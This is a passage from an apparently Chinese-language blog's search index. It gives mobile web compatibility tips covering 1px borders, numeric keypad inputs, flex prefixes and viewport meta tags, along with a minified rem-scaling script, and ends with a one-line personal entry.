实现<br>部分安卓机器(比如小米)的分辨率低，如果border的宽度小于1px。安卓机出现一种边框消失了的现象。样式上有点奇怪，IOS没有这个问题。<br>由于设备高分辨率屏的原因，逻辑像素的 1px 的 border 在移动设备上会用两个或三个物理像素来表示，所以看起来会感觉很粗。解决方案有很多，但兼容性最好的方案是用伪元素的 box-shadow 或 border 实现 border，然后用 transform: scale(.5) 缩小到原来的一半<br>6、键盘</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type<span class="operator">=</span><span class="string">&quot;number&quot;</span> pattern<span class="operator">=</span><span class="string">&quot;[0-9]*&quot;</span> /&gt;</span><br><span class="line">&lt;input type<span class="operator">=</span><span class="string">&quot;password&quot;</span> pattern<span class="operator">=</span><span class="string">&quot;[0-9]*&quot;</span> /&gt;</span><br></pre></td></tr></table></figure><p>注意：只有number或者tel还是不够，只有加入正则，ios才会出现九宫格<br>7、flex布局</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">display</span>: flex;</span><br><span class="line"><span class="attribute">display</span>: -webkit-box;</span><br><span class="line"><span class="attribute">display</span>: -webkit-flex; </span><br></pre></td></tr></table></figure><p>注： 如果用flx布局必须要加后面两行，不加的话，ios版本为8的苹果机子页面会错乱（很严重！！！）<br>8、添加meta，使得网页在手机端能正常浏览</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&lt;!--</span> 设置缩放 <span class="operator">--&gt;</span></span><br><span class="line"><span class="operator">&lt;</span>meta name<span class="operator">=</span><span class="string">&quot;viewport&quot;</span> content<span class="operator">=</span><span class="string">&quot;width=device-width, initial-scale=1, user-scalable=no&quot;</span> <span class="operator">/&gt;</span></span><br><span class="line"><span class="operator">&lt;!--</span> 可隐藏地址栏，仅针对<span class="type">IOS的Safari（注：IOS7</span>.<span class="number">0</span>版本以后，safari上已看不到效果） <span class="operator">--&gt;</span></span><br><span class="line"><span class="operator">&lt;</span>meta name<span class="operator">=</span><span class="string">&quot;apple-mobile-web-app-capable&quot;</span> content<span class="operator">=</span><span class="string">&quot;yes&quot;</span> <span class="operator">/&gt;</span></span><br><span class="line"><span class="operator">&lt;!--</span> 仅针对<span class="type">IOS的Safari顶端状态条的样式（可选default</span><span class="operator">/</span>black<span class="operator">/</span>black<span class="operator">-</span>translucent ） <span class="operator">--&gt;</span></span><br><span class="line"><span class="operator">&lt;</span>meta name<span class="operator">=</span><span class="string">&quot;apple-mobile-web-app-status-bar-style&quot;</span> content<span class="operator">=</span><span class="string">&quot;black&quot;</span> <span class="operator">/&gt;</span></span><br><span class="line"><span class="operator">&lt;!--</span> <span class="type">IOS中禁用将数字识别为电话号码</span><span class="operator">/</span>忽略<span class="type">Android平台中对邮箱地址的识别</span> <span class="operator">--&gt;</span></span><br><span class="line"><span class="operator">&lt;</span>meta name<span class="operator">=</span><span class="string">&quot;format-detection&quot;</span> content<span class="operator">=</span><span class="string">&quot;telephone=no, email=no&quot;</span> <span class="operator">/&gt;</span></span><br></pre></td></tr></table></figure><p>9、使用rem时js动态计算自动生成meta标签，这里是一段阿里高清方案，使用时需要放到文档头部，此时就不用再写meta标签了</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">!</span>(function(e) &#123;</span><br><span class="line">function t(a) &#123;</span><br><span class="line"><span class="keyword">if</span> (i[a]) <span class="keyword">return</span> i[a].exports;</span><br><span class="line"><span class="keyword">var</span> n <span class="operator">=</span> (i[a] <span class="operator">=</span> &#123; exports: &#123;&#125;, id: a, loaded: <span class="operator">!</span><span class="number">1</span> &#125;);</span><br><span class="line"><span class="keyword">return</span> e[a].call(n.exports, n, n.exports, t), (n.loaded <span class="operator">=</span> <span class="operator">!</span><span class="number">0</span>), n.exports;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> i <span class="operator">=</span> &#123;&#125;;</span><br><span class="line"><span class="keyword">return</span> (t.m <span class="operator">=</span> e), (t.c <span class="operator">=</span> i), (t.p <span class="operator">=</span> &#x27;&#x27;), t(<span class="number">0</span>);</span><br><span class="line">&#125;)([</span><br><span class="line">function(e, t) &#123;</span><br><span class="line">&#x27;use strict&#x27;;</span><br><span class="line"><span class="type">Object</span>.defineProperty(t, &#x27;__esModule&#x27;, &#123; value: <span class="operator">!</span><span class="number">0</span> &#125;);</span><br><span class="line"><span class="keyword">var</span> i <span class="operator">=</span> window;</span><br><span class="line">(t[&#x27;<span class="keyword">default</span>&#x27;] <span class="operator">=</span> i.flex <span class="operator">=</span> function(normal, e, t) &#123;</span><br><span class="line"><span class="keyword">var</span> a <span class="operator">=</span> e <span class="operator">||</span> <span class="number">100</span>,</span><br><span class="line">n <span class="operator">=</span> t <span class="operator">||</span> <span class="number">1</span>,</span><br><span class="line">r <span class="operator">=</span> i.document,</span><br><span class="line">o <span class="operator">=</span> navigator.userAgent,</span><br><span class="line">d <span class="operator">=</span> o.match(<span class="operator">/</span><span class="type">Android</span>[\<span class="type">S</span>\s]<span class="operator">+</span><span class="type">AppleWebkit</span>\<span class="operator">/</span>(\d&#123;<span class="number">3</span>&#125;)<span class="operator">/</span>i),</span><br><span class="line">l <span class="operator">=</span> o.match(<span class="operator">/</span><span class="type">U3</span>\<span class="operator">/</span>((\d<span class="operator">+|</span>\.)&#123;<span class="number">5</span>,&#125;)<span class="operator">/</span>i),</span><br><span class="line">c <span class="operator">=</span> l <span class="operator">&amp;&amp;</span> parseInt(l[<span class="number">1</span>].split(&#x27;.&#x27;).join(&#x27;&#x27;), <span class="number">10</span>) <span class="operator">&gt;=</span> <span class="number">80</span>,</span><br><span class="line">p <span class="operator">=</span> navigator.appVersion.match(<span class="operator">/</span>(iphone<span class="operator">|</span>ipad<span class="operator">|</span>ipod)<span class="operator">/</span>gi),</span><br><span class="line">s <span class="operator">=</span> i.devicePixelRatio <span class="operator">||</span> <span class="number">1</span>;</span><br><span class="line">p <span class="operator">||</span> (d <span class="operator">&amp;&amp;</span> d[<span class="number">1</span>] <span class="operator">&gt;</span> <span class="number">534</span>) <span class="operator">||</span> c <span class="operator">||</span> (s <span class="operator">=</span> <span class="number">1</span>);</span><br><span class="line"><span class="keyword">var</span> u <span class="operator">=</span> normal <span class="operator">?</span> <span class="number">1</span> : <span class="number">1</span> <span class="operator">/</span> s,</span><br><span class="line">m <span class="operator">=</span> r.querySelector(&#x27;meta[name<span class="operator">=</span><span class="string">&quot;viewport&quot;</span>]&#x27;);</span><br><span class="line">m <span class="operator">||</span> ((m <span class="operator">=</span> r.createElement(&#x27;meta&#x27;)), m.setAttribute(&#x27;name&#x27;, &#x27;viewport&#x27;), r.head.appendChild(m)),</span><br><span class="line">m.setAttribute(</span><br><span class="line">&#x27;content&#x27;,</span><br><span class="line">&#x27;width<span class="operator">=</span>device<span class="operator">-</span>width,user<span class="operator">-</span>scalable<span class="operator">=</span>no,initial<span class="operator">-</span>scale<span class="operator">=</span>&#x27; <span class="operator">+</span></span><br><span class="line">u <span class="operator">+</span></span><br><span class="line">&#x27;,maximum<span class="operator">-</span>scale<span class="operator">=</span>&#x27; <span class="operator">+</span></span><br><span class="line">u <span class="operator">+</span></span><br><span class="line">&#x27;,minimum<span class="operator">-</span>scale<span class="operator">=</span>&#x27; <span class="operator">+</span></span><br><span class="line">u</span><br><span class="line">),</span><br><span class="line">(r.documentElement.style.fontSize <span class="operator">=</span> normal <span class="operator">?</span> &#x27;50px&#x27; : a <span class="operator">/</span> <span class="number">2</span> <span class="operator">*</span> s <span class="operator">*</span> n <span class="operator">+</span> &#x27;px&#x27;);</span><br><span class="line">&#125;),</span><br><span class="line">(e.exports <span class="operator">=</span> t[&#x27;<span class="keyword">default</span>&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">]);</span><br><span class="line">flex(<span class="literal">false</span>, <span class="number">100</span>, <span class="number">1</span>);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 日常杂疑 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>胖友</title>
      <link href="/Blog/2017/04/28/daisy/%E8%83%96%E5%8F%8B/index/"/>
      <url>/Blog/2017/04/28/daisy/%E8%83%96%E5%8F%8B/index/</url>
      
        <content type="html"><![CDATA[<p>她姓高。</p>]]></content>
      
      
      <categories>
          
          <category> daisy </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
